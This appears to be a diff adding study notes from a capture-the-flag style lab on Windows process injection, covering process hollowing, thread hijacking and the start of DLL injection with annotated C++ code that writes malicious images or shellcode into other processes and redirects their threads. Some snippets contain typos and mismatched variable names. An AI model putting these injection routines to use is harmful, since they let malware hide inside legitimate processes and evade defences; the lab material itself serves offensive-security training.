@@ -206,3 +206,211 @@ pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProc
 ); // Obtains ZwUnmapViewOfSection from ntdll
 
 DWORD dwResult = pZwUnmapViewOfSection(
+	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+	pTargetImageBaseAddress // Base address of the process
+);
+```
+At step four, we must begin by allocating memory in the hollowed process. We can use VirtualAlloc similar to step two to allocate memory. This time we need to obtain the size of the image found in file headers. e_lfanew can identify the number of bytes from the DOS header to the PE header. Once at the PE header, we can obtain the SizeOfImage from the Optional header.
+```text
+PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
+PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew
+
+DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure
+
+PVOID pHollowAddress = VirtualAllocEx(
+	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+	pTargetImageBaseAddress, // Base address of the process
+	sizeOfMaliciousImage, // Byte size obtained from optional header
+	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
+	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
+);
+```
+Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we must first write the PE headers then the PE sections. To write PE headers, we can use WriteProcessMemory and the size of headers to determine where to stop.
+```text
+if (!WriteProcessMemory(
+	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+	pTargetImageBaseAddress, // Base address of the process
+	pMaliciousImage, // Local memory where the malicious file resides
+	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
+	NULL
+)) {
+	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
+}
+```
+Now we need to write each section. To find the number of sections, we can use  NumberOfSections from the NT headers. We can loop through e_lfanew and the size of the current header to write each section.
+```text
+for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
+	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header
+
+	WriteProcessMemory(
+		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
+		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
+		pSectionHeader->SizeOfRawData, // Byte size of current section
+		NULL
+	);
+}
+```
+It is also possible to use relocation tables to write the file to target memory. This will be discussed in more depth in task 6.
+At step five, we can use SetThreadContext to change EAX to point to the entry point.
+```text
+c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header
+
+SetThreadContext(
+	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
+	&c // Pointer to the stored context structure
+);
+```
+At step six, we need to take the process out of a suspended state using ResumeThread.
+```text
+ResumeThread(
+	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
+);
+```
+We can compile these steps together to create a process hollowing injector. Use the C++ injector provided and experiment with process hollowing.
+Identify a PID of a process running as THM-Attacker to target. Supply the PID and executable name as arguments to execute hollowing-injector.exe located in the injectors directory on the desktop.
+![[Pasted image 20220912170806.png]]
+What flag is obtained after hollowing and injecting the shellcode?
+### Abusing Process Components
+At a high-level thread (execution) hijacking can be broken up into eleven steps:
+Locate and open a target process to control.
+Allocate memory region for malicious code.
+Write malicious code to allocated memory.
+Identify the thread ID of the target thread to hijack.
+Open the target thread.
+Suspend the target thread.
+Obtain the thread context.
+Update the instruction pointer to the malicious code.
+Rewrite the target thread context.
+Resume the hijacked thread.
+We will break down a basic thread hijacking script to identify each of the steps and explain in more depth below.
+The first three steps outlined in this technique following the same common steps as normal process injection. These will not be explained, instead, you can find the documented source code below.
+```text
+HANDLE hProcess = OpenProcess(
+	PROCESS_ALL_ACCESS, // Requests all possible access rights
+	FALSE, // Child processes do not inheret parent process handle
+	processId // Stored process ID
+);
+PVOIF remoteBuffer = VirtualAllocEx(
+	hProcess, // Opened target process
+	NULL, 
+	sizeof shellcode, // Region size of memory allocation
+	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
+	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
+);
+WriteProcessMemory(
+	processHandle, // Opened target process
+	remoteBuffer, // Allocated memory region
+	shellcode, // Data to write
+	sizeof shellcode, // byte size of data
+	NULL
+);
+```
+Once the initial steps are out of the way and our shellcode is written to memory we can move to step four. At step four, we need to begin the process of hijacking the process thread by identifying the thread ID. To identify the thread ID we need to use a trio of Windows API calls: CreateToolhelp32Snapshot(), Thread32First(), and Thread32Next(). These API calls will collectively loop through a snapshot of a process and extend capabilities to enumerate process information.
+```text
+THREADENTRY32 threadEntry;
+
+HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
+	TH32CS_SNAPTHREAD, // Include all processes residing on the system
+	0 // Indicates the current process
+);
+Thread32First( // Obtains the first thread in the snapshot
+	hSnapshot, // Handle of the snapshot
+	&threadEntry // Pointer to the THREADENTRY32 structure
+);
+
+while (Thread32Next( // Obtains the next thread in the snapshot
+	snapshot, // Handle of the snapshot
+	&threadEntry // Pointer to the THREADENTRY32 structure
+)) {
+```
+At step five, we have gathered all the required information in the structure pointer and can open the target thread. To open the thread we will use OpenThread with the THREADENTRY32 structure pointer.
+```text
+if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
+		{
+			HANDLE hThread = OpenThread(
+				THREAD_ALL_ACCESS, // Requests all possible access rights
+				FALSE, // Child threads do not inheret parent thread handle
+				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
+			);
+			break;
+		}
+```
+At step six, we must suspend the opened target thread. To suspend the thread we can use SuspendThread.
+```text
+SuspendThread(hThread);
+```
+At step seven, we need to obtain the thread context to use in the upcoming API calls. This can be done using GetThreadContext to store a pointer.
+```text
+CONTEXT context;
+GetThreadContext(
+	hThread, // Handle for the thread 
+	&context // Pointer to store the context structure
+);
+```
+At step eight, we need to overwrite RIP (Instruction Pointer Register) to point to our malicious region of memory. If you are not already familiar with CPU registers, RIP is an x64 register that will determine the next code instruction; in a nutshell, it controls the flow of an application in memory. To overwrite the register we can update the thread context for RIP.
+```text
+context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
+```
+At step nine, the context is updated and needs to be updated to the current thread context. This can be easily done using SetThreadContext and the pointer for the context.
+```text
+SetThreadContext(
+	hThread, // Handle for the thread 
+	&context // Pointer to the context structure
+);
+```
+At the final step, we can now take the target thread out of a suspended state. To accomplish this we can use ResumeThread.
+```text
+ResumeThread(
+	hThread // Handle for the thread
+);
+```
+We can compile these steps together to create a process injector via thread hijacking. Use the C++ injector provided and experiment with thread hijacking.
+Identify a PID of a process running as THM-Attacker to target. Supply the PID as an argument to execute thread-injector.exe located in the Injectors directory on the desktop.
+![[Pasted image 20220912171200.png]]
+What flag is obtained after hijacking the thread?
+### Abusing DLLs
+At a high-level DLL injection can be broken up into six steps:
+Locate a target process to inject.
+Open the target process.
+Allocate memory region for malicious DLL.
+Write the malicious DLL to allocated memory.
+Load and execute the malicious DLL.
+We will break down a basic DLL injector to identify each of the steps and explain in more depth below.
+At step one of DLL injection, we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: CreateToolhelp32Snapshot(), Process32First(), and Process32Next().
+```text
+DWORD getProcessId(const char *processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
+			TH32CS_SNAPPROCESS, // Include all processes residing on the system
+			0 // Indicates the current process
+		);
+    if (hSnapshot) {
+        PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
+        entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
+        if (Process32First( // Obtains the first process in the snapshot
+					hSnapshot, // Handle of the snapshot
+					&entry // Pointer to the PROCESSENTRY32 structure
+				)) {
+            do {
+                if (!strcmp( // Compares two strings to determine if the process name matches
+									entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
+									processName // Supplied process name
+								)) { 
+                    return entry.th32ProcessID; // Process ID of matched process
+                }
+            } while (Process32Next( // Obtains the next process in the snapshot
+							hSnapshot, // Handle of the snapshot
+							&entry
+						)); // Pointer to the PROCESSENTRY32 structure
+        }
+    }
+
+DWORD processId = getProcessId(processName); // Stores the enumerated process ID
+```
+At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: GetModuleHandle, GetProcAddress, or OpenProcess.
+```text
+HANDLE hProcess = OpenProcess(
+	PROCESS_ALL_ACCESS, // Requests all possible access rights
+	FALSE, // Child processes do not inheret parent process handle
+	processId // Stored process ID
+);
